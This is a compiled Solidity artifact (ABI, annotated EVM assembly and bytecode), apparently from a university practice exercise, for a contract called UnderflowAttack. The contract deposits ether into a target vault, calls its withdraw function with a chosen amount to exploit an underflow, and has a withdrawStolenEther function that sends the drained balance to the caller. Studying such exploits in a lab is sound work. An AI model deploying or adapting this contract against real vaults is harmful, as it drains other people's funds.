{
	"PRACTICA 9/CryptoVault2.sol": {
		"UnderflowAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "at_contract",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "cantidad",
							"type": "uint256"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "deposit",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawStolenEther",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n  mstore(0x40, 0x80)\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":8010:8021  at_contract */\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7991:8007  attackedContract */\n  0x00\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7991:8021  attackedContract = at_contract */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x24d8e86b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x64dd891a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_8:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n      pop\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_11\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_11:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      pop\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_13:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_14\n      jump\t// in\n    tag_12:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n    tag_10:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8759  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8768  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      0x08fc\n        /* \"PRACTICA 9/CryptoVault2.sol\":8769:8790  address(this).balance */\n      selfbalance\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n    tag_14:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8516:8528  bool success */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8548  attackedContract */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8553  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8599:8607  cantidad */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8609  attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_21:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_21)\n    tag_23:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8609  attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_26\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_25)\n        /* \"--CODEGEN--\":14:41   */\n    tag_26:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_25:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8515:8609  (bool success,)= attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8628:8635  success */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":8620:8682  require(success, \"Encima de ladrón soy tonto y no se atacar\") */\n      tag_27\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x2a\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3\n      0x2a\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_27:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n    tag_16:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8137:8140  100 */\n      0x64\n        /* \"PRACTICA 9/CryptoVault2.sol\":8125:8134  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":8125:8140  msg.value >=100 */\n      lt\n      iszero\n        /* \"PRACTICA 9/CryptoVault2.sol\":8117:8191  require(msg.value >=100, \"Has depositado una cantidad demasiado pequeña\") */\n      tag_29\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x2e\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c\n      0x2e\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_29:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8205:8217  bool success */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8237  attackedContract */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8242  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8249:8258  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xd0e30db000000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8297  attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_30:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_30)\n    tag_32:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8297  attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_35\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_34)\n        /* \"--CODEGEN--\":14:41   */\n    tag_35:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_34:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8204:8297  (bool success, )=attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8316:8323  success */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":8308:8367  require(success, \"No habido exito a la hora de depositar.\") */\n      tag_36\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x27\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173\n      0x27\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_36:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n      pop\n      jump\t// out\n    stop\n    data_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173 4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e\n    data_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3 456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172\n    data_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c 486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161\n\n    auxdata: 0xa2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516106013803806106018339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061056d806100946000396000f3fe6080604052600436106100385760003560e01c806324d8e86b1461004457806364dd891a1461005b578063d0e30db0146100965761003f565b3661003f57005b600080fd5b34801561005057600080fd5b506100596100a0565b005b34801561006757600080fd5b506100946004803603602081101561007e57600080fd5b81019080803590602001909291905050506100e9565b005b61009e6102a9565b005b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100e6573d6000803e3d6000fd5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051602401808281526020019150506040516020818303038152906040527f2e1a7d4d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101e457805182526020820191506020810190506020830392506101c1565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610246576040519150601f19603f3d011682016040523d82523d6000602084013e61024b565b606091505b50509050806102a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602a8152602001806104e0602a913960400191505060405180910390fd5b5050565b6064341015610303576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602e81526020018061050a602e913960400191505060405180910390fd5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16346040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106103f457805182526020820191506020810190506020830392506103d1565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610456576040519150601f19603f3d011682016040523d82523d6000602084013e61045b565b606091505b50509050806104b5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260278152602001806104b96027913960400191505060405180910390fd5b5056fe4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161a2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033",
